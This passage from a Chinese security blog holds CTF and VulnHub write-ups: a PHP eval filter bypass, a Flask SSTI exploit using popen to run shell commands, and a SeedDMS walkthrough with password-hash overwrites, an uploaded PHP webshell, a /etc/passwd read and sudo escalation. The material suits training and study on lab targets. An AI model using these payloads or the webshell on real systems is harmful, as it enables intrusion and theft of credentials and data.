<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="解题">2. 解题</h1>
<p>第一个 <code>if</code> 过滤了一些伪协议；</p>
<p>第二个 <code>if</code>
比较难，第一次遇见，这是过滤了函数的参数。<code>?(R)?</code>
是递归匹配模式的意思。匹配到的字符串都会被空代替，最后还需要满足强对比。所以，我们传入的exp在最后得有
<code>;</code> ，并且前面的部分都要被匹配，从而只剩下
<code>;</code>。</p>
<p>详细解释一下第二个匹配模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-z,_]+\((?R)?\)可以分为以下4个部分：</span><br><span class="line">1. [a-z,_]  </span><br><span class="line">2. \(   </span><br><span class="line">3. (?R)?   </span><br><span class="line">4. \)</span><br></pre></td></tr></table></figure>
<p>假设输入的为
<code>print_r(scandir());</code>。这句话就是扫描某目录（此时目录并未指定），然后把目录下的所有文件名or子目录名形成一个数组返回并打印出来。</p>
<table>
<colgroup>
<col style="width: 25%" />
<col style="width: 25%" />
<col style="width: 25%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">过程</th>
<th style="text-align: center;">被匹配的部分</th>
<th style="text-align: center;">备注</th>
<th style="text-align: center;">递归层数</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">print_r</td>
<td style="text-align: center;"><code>[a-z,_]</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td style="text-align: center;">print_r(</td>
<td style="text-align: center;"><code>\(</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td style="text-align: center;">print_r(scandir</td>
<td style="text-align: center;"><code>(?R)?</code>
起作用，进入递归，再次匹配<code>[a-z,_]</code></td>
<td style="text-align: center;">1</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td style="text-align: center;">print_r(scandir(</td>
<td style="text-align: center;"><code>\(</code> 再次起作用</td>
<td style="text-align: center;">1</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5</td>
<td style="text-align: center;">print_r(scandir()</td>
<td style="text-align: center;">进入第一个递归之后的 <code>\)</code>
起作用<br>执行之后退出第一次递归</td>
<td
style="text-align: center;">执行时属于：1<br>执行结束后退出第一层递归：0</td>
</tr>
<tr class="even">
<td style="text-align: center;">6</td>
<td style="text-align: center;">print_r(scandir())</td>
<td style="text-align: center;"><code>\)</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
</tbody>
</table>
<p>最后剩下一个 <code>;</code>
成功匹配。如果带有参数，比如：<code>print_r(scandir('/'));</code>，到第4步为止都是一样的，第5步的时候因为此时应该匹配的是
<code>\)</code> ，但是，此时字符串的位置是 <code>'/')</code>
无法成功匹配，返回原来的字符串，从而无法绕过第二个 <code>if</code>。</p>
<p>成功绕过演示：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200901.png" /></p>
<p>失败演示：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200923.png" /></p>
<p>第三个 <code>if</code> 也比较简单，只是过滤了一些敏感词。</p>
<p>接下来就要做两件事：</p>
<ol type="1">
<li><p>找 flag 所在的路径，一般在当前目录或者根目录</p></li>
<li><p>找到了该怎么把路径表示出来，此时不能传入参数</p></li>
</ol>
<p>接下来需要对 PHP
比较了解的人能够想得到（反正我个菜鸟没有想到），先介绍几个函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. localeconv(): 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="number">2</span>. scandir(): 列出给定目录中的文件和目录。</span><br><span class="line"><span class="number">3</span>. readfile(): 输出一个文件。本题中，如果使用该函数输出flag，需要在源码中查看</span><br><span class="line"><span class="number">4</span>. current(): 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="number">5</span>. pos(): current() 的别名。</span><br><span class="line"><span class="number">6</span>. next(): 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="number">7</span>. array_reverse(): 以相反的元素顺序返回数组。</span><br><span class="line"><span class="number">8</span>. highlight_file(): 打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br><span class="line"><span class="number">9</span>. array_flip(): 将数组的键和值互换</span><br><span class="line"><span class="number">10</span>. array_rand(): 随机读取数组中的一个或多个单元</span><br></pre></td></tr></table></figure>
<p>以上最难理解的就是
<code>localeconv()</code>，但是这又是最关键的，因为不能传入参数，所以得想方设法找到路径
<code>/</code> 和 <code>.</code> ，而该函数就能够找到后者。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200955.png" /></p>
<p>注意上图中的箭头处，那是 <code>.</code>
。因此，我们只要将它取出来即可，这时候就需要用到<code>current()</code>
了。然后再配合上 <code>scandir()</code> 和 <code>print_r</code>
就可以得到当前目录下的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
<p>返回结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201026.png" /></p>
<p>注意到 <code>flag.php</code>
在第4个，或者说是倒数第2个。此时有两种方法：</p>
<p>第一种，将整个数组反转，然后用 next() 取反转后的第二个元素，即
flag.php。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201059.png" /></p>
<p>第二种比较看运气，利用 <code>array_flip()</code>
将交换数组的键和值</p>
<p><code>?exp=print_r(array_flip(scandir(current(localeconv()))));</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201121.png" /></p>
<p>然后利用 <code>array_rand(array_flip())</code>
将数组的键<strong>随机</strong>的读取</p>
<p><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201131.png" /></p>
<p>最终的 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>由于随机性，所以需要多刷新几次。</p>
<h1 id="总结">3. 总结</h1>
<p>由于对 PHP
代码的不熟悉，导致本题最多只能做到代码审计这一步。得挑个时候学学 PHP
了，跑不掉的呀。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>git泄露</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <url>/2022/04/18/GYCTF2020%20FlaskApp/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BGYCTF2020%5DFlaskApp">FlaskApp</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223449.png" /></p>
<p>经过测试，确实该题目可以进行base64加密和解密。该页面的框架是Flask，因此可能存在着SSTI。直接用<code>&#123;&#123;7*'7'&#125;&#125;</code>用base64加密后再解密，发现提示</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223727.png" /></p>
<p>换一个，用<code>&#123;&#123;0-0&#125;&#125;</code>，这时候得到的结果就是0，因此确实存在SSTI，并且渲染引擎是Flask。</p>
<h1 id="解题">2. 解题</h1>
<p>参考：<a
href="Jinjia2+Flask模板注入.md">Jinjia2+Flask模板注入</a></p>
<p>输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224035.png" /></p>
<p>结果经过了html编码，可以看出第二个才是<code>object</code>。</p>
<p>下一步，查看有哪些可用的子类 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现并没有任何结果，但是如果输入如下， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[1]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224237.png" /></p>
<p>是可以显示结果的。因此猜测后台可能做了某些处理，如果返回的字符超过一定的长度，就不显示结果。通过抓包发现，是POST提交参数test。因此，编写脚本自动化测试（写的不怎么好）：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, html  </span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup  </span><br><span class="line">url = <span class="string">&#x27;http://6d8599e6-3743-4264-bad5-d406f5736b3f.node4.buuoj.cn:81/decode&#x27;</span>  </span><br><span class="line">payload = <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[%d]&#125;&#125;&#x27;</span>  </span><br><span class="line">results = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):  </span><br><span class="line">    text = payload % i  </span><br><span class="line">    text = base64.b64encode(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    param=&#123;  </span><br><span class="line">        <span class="string">&#x27;text&#x27;</span>: text  </span><br><span class="line">    &#125;  </span><br><span class="line">    t = requests.post(url, params=param)  </span><br><span class="line">    soup = BeautifulSoup(t.content, <span class="string">&quot;lxml&quot;</span>)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        res = soup.body.contents[<span class="number">3</span>].div.contents[<span class="number">2</span>].strip()[<span class="number">5</span>:]  <span class="comment"># 返回结果的字符串</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt;= <span class="number">2</span>:  <span class="comment"># 如果长度太短，说明没有子类了（不知道有没有可能中间空了一个）</span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        res = html.unescape(res)  </span><br><span class="line">        results.append(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  </span><br><span class="line">    <span class="keyword">except</span>:  <span class="comment"># 有些可能没有返回的结果，做另外处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> is error&quot;</span>)  </span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  <span class="comment"># 可以不用这句</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;\n&#x27;</span>  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ress.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(<span class="built_in">str</span>.join(results)) <span class="comment"># 写入文件</span></span><br></pre></td></tr></table></figure></p>
<p>最后查看得到的文件，从中寻找可用的子类，我才用<code>127. &lt;class 'os._wrap_close'&gt;</code></p>
<p>因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现被过滤了，经过测试发现，过滤了<code>os</code>,
<code>popen</code>和<code>flag</code>。绕过方法比较简单<strong>字符串拼接:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225355.png" /></p>
<p>然后查看flag的payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;cat /this_is_the_fl&#x27;+&#x27;ag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225427.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack Me Please Writeup</title>
    <url>/2022/05/26/Hack%20Me%20Please%20Writeup/</url>
    <content><![CDATA[<p>该靶机官方的难度为简单，但是其实并不简单，很考验信息收集能力。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/hack-me-please-1,731/">Hack
Me Please: 1 ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526105514.png" /></p>
<h2 id="http服务">2.2. http服务</h2>
<blockquote>
<p>需要注意的是必须挂梯子才能够访问该页面，因为该页面请求了Google的api</p>
</blockquote>
<p>主页面花里胡哨，但是没有一个有用的功能点</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526112928.png" /></p>
<p>路径扫描，也没有任何有用的信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526113046.png" /></p>
<p>查看主页面的页面源码，发现了许多js文件，实在没办法，只能查看这些了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526113126.png" /></p>
<p>在 /js/main.js 中找到一个新的路径</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526113158.png" /></p>
<p>直接访问得到的新路径，得到一个登录界面，经尝试之后发现不存在SQL注入</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526113256.png" /></p>
<p>注意到 CMS 是 SeedDMS，但是经过搜索，没有该版本的漏洞</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526113327.png" /></p>
<p>对 /seeddms51x 目录进行路径扫描</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526113915.png" /></p>
<p>分别对两者再次进行路径扫描，在 /conf
中发现了一个状态码为200的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526114053.png" /></p>
<p>访问该文件，得到数据库信息：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526114147.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbDriver=&quot;mysql&quot; </span><br><span class="line">dbHostname=&quot;localhost&quot; </span><br><span class="line">dbDatabase=&quot;seeddms&quot; </span><br><span class="line">dbUser=&quot;seeddms&quot; </span><br><span class="line">dbPass=&quot;seeddms&quot; </span><br><span class="line">doNotCheckVersion=&quot;false&quot;</span><br></pre></td></tr></table></figure>
<h2 id="mysql服务">2.3. MySQL服务</h2>
<p>输入下面命令远程连接： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -h 10.0.2.57 -u seeddms -p</span><br></pre></td></tr></table></figure></p>
<p>在 seeddms 数据库中的 users 表中得到如下信息：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526121829.png" /></p>
<p>在 seeddms 数据库中的 tblUsers 表中找到了用户登录后台的信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526115616.png" /></p>
<p>将 admin
的密码进行暴力破解，但是失败了。后来想到<strong>可以直接修改密码</strong>，不过修改完的必须是md5加密的（一般都是md5加密）。所以可以利用下面命令生成md5加密的密码：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -n  123456  | openssl md5</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注意：<code>-n</code>
表示不输入回车符。如果不加，则会默认在字符串后面加上回车，然后再加密。</p>
</blockquote>
<p>然后在数据库中输入如下命令修改：(下面的命令会修改所有用户的密码，不过这里无所谓了)
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update tblUsers <span class="keyword">set</span> pwd<span class="operator">=</span><span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>然后利用 <code>admin:123456</code> 登录后台</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526120054.png" /></p>
<h1 id="get-shell">3. get shell</h1>
<p>发现在 添加文档 处可以上传文件（上传了kali自带的反弹shell的后门）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526120859.png" /></p>
<p>点击保存文档之后页面会是空白的，但是其实已经上传成功了，回到后台主页面刷新以下即可</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526121020.png" /></p>
<p>但是我们还不知道文件上传之后的路径，这时候想起来之前查询seeddms的漏洞的时候有一些漏洞，其中有一个RCE漏洞，查看内容
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]</span><br><span class="line"># Google Dork: [NA]</span><br><span class="line"># Date: [20-June-2019]</span><br><span class="line"># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)</span><br><span class="line"># Vendor Homepage: [https://www.seeddms.org]</span><br><span class="line"># Software Link: [https://sourceforge.net/projects/seeddms/files/]</span><br><span class="line"># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)</span><br><span class="line"># Tested on: [NA]</span><br><span class="line"># CVE : [CVE-2019-12744]</span><br><span class="line"></span><br><span class="line">Exploit Steps:</span><br><span class="line"></span><br><span class="line">Step 1: Login to the application and under any folder add a document.</span><br><span class="line">Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.</span><br><span class="line"></span><br><span class="line">PHP Backdoor Code:</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_REQUEST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        $cmd = ($_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">        system($cmd);</span><br><span class="line">        echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">        die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Step 3: Now after uploading the file check the document id corresponding to the document.</span><br><span class="line">Step 4: Now go to example.com/data/1048576/&quot;document_id&quot;/1.php?cmd=cat+/etc/passwd to get the command response in browser.</span><br><span class="line"></span><br><span class="line">Note: Here &quot;data&quot; and &quot;1048576&quot; are default folders where the uploaded files are getting saved.</span><br></pre></td></tr></table></figure></p>
<p>可以看到原理其实也是登录后台，然后上传后门。step4里面就有路径，尝试一下，</p>
<p>首先得到我们的documentid</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526121500.png" /></p>
<p>然后访问： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.57/seeddms51x/data/1048576/6/1.php</span><br></pre></td></tr></table></figure></p>
<p>注意kali要提前监听对应端口。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526121618.png" /></p>
<p>成功反弹shell</p>
<h1 id="权限提升">4. 权限提升</h1>
<p>查看 /etc/passwd，发现存在一个用户
saket，注意到刚刚在数据库中得到的信息 [[#MySQL服务]]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:saket</span><br><span class="line">password:Saket@#$1337</span><br></pre></td></tr></table></figure>
<p>直接切换到 saket 用户 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su saket</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526122053.png" /></p>
<p>成功，并且该用户是 lxd 组的用户。注意[[lxd提权]]</p>
<p>既然我们具有该用户的密码，必然需要查看以下sudo配置 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526122151.png" /></p>
<p>居然具有全部的权限，那么直接输入下面命令提升为root：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526122223.png" /></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机并不没有想象中那么简单，尤其是拿到webshell的过程，需要查看js，xml等文档，一般打靶的过程，这些类型的文档是不怎么看的。涉及的攻击方法有：</p>
<ol type="1">
<li>信息收集 -&gt; js, xml 文档都需要看</li>
<li>MySQL修改</li>
<li>文件上传</li>
<li>现有漏洞利用</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>文件上传</tag>
        <tag>信息收集</tag>
        <tag>MySQL基础</tag>
        <tag>现有漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>HackableⅡ Writeup</title>
    <url>/2022/05/24/Hackable%E2%85%A1%20Writeup/</url>
    <content><![CDATA[<p>该靶机比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/hackable-ii,711/">Hackable:
II ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>简单</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.54</span><br><span class="line">3. sudo nmap -p21,22,80 -A 10.0.2.54</span><br></pre></td></tr></table></figure>
<p>将上面三条命令结合，写了一个脚本代替（<code>port_info.py</code>）：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os, re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIP</span>():</span></span><br><span class="line">    pat = <span class="string">&#x27;\n([0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;.[0-9]&#123;1,3&#125;)&#x27;</span></span><br><span class="line">    r = re.<span class="built_in">compile</span>(pat, re.DOTALL)</span><br><span class="line">    info = os.popen(<span class="string">&#x27;arp-scan -l&#x27;</span>).read()</span><br><span class="line">    iplst = r.findall(info) <span class="comment"># 获得C段内所有IP</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> iplst:</span><br><span class="line">        ip_d = ip.rsplit(<span class="string">&#x27;.&#x27;</span>, maxsplit=<span class="number">1</span>)[<span class="number">1</span>]<span class="comment"># 获得d段</span></span><br><span class="line">        <span class="keyword">if</span> ip_d == <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> ip_d == <span class="string">&#x27;2&#x27;</span> <span class="keyword">or</span> ip_d == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_port</span>(<span class="params">ip</span>):</span></span><br><span class="line">    resList = []</span><br><span class="line">    pat = <span class="string">&#x27;SERVICE(.*)MAC&#x27;</span></span><br><span class="line">    r = re.<span class="built_in">compile</span>(pat, re.DOTALL)</span><br><span class="line">    command = <span class="string">&#x27;nmap -p- &#x27;</span> + ip</span><br><span class="line">    info = os.popen(command).read()</span><br><span class="line">    rlst = r.findall(info)[<span class="number">0</span>].split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> rlst:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> item:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        port_sta_ser_lst = item.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        port = port_sta_ser_lst[<span class="number">0</span>].split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        pro = port_sta_ser_lst[<span class="number">0</span>].split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        state = port_sta_ser_lst[<span class="number">1</span>]</span><br><span class="line">        service = port_sta_ser_lst[-<span class="number">1</span>]</span><br><span class="line">        resList.append((port, pro, state, service))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portInfo</span>(<span class="params">ip, infoList</span>):</span></span><br><span class="line">    portlst = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> infoList:</span><br><span class="line">        port = item[<span class="number">0</span>]</span><br><span class="line">        portlst.append(port)</span><br><span class="line"></span><br><span class="line">    ports = <span class="string">&#x27;,&#x27;</span>.join(portlst)</span><br><span class="line">    command = <span class="string">&#x27;nmap -p&#x27;</span> + ports + <span class="string">&#x27; -A &#x27;</span> + ip</span><br><span class="line">    info = os.popen(command).read()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    targetIP = getIP()</span><br><span class="line">    infoList = open_port(targetIP)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;target&#x27;s IP is : %s&quot;</span> % targetIP)</span><br><span class="line">    <span class="built_in">print</span>(portInfo(targetIP, infoList))</span><br></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./port_info.py</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220524121330.png" /></p>
<p>可以发现 21 端口上的服务为 ftp，并且允许匿名登录</p>
<h2 id="ftp服务">2.2. ftp服务</h2>
<p>使用下面命令匿名登录： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 10.0.2.54 21</span><br></pre></td></tr></table></figure></p>
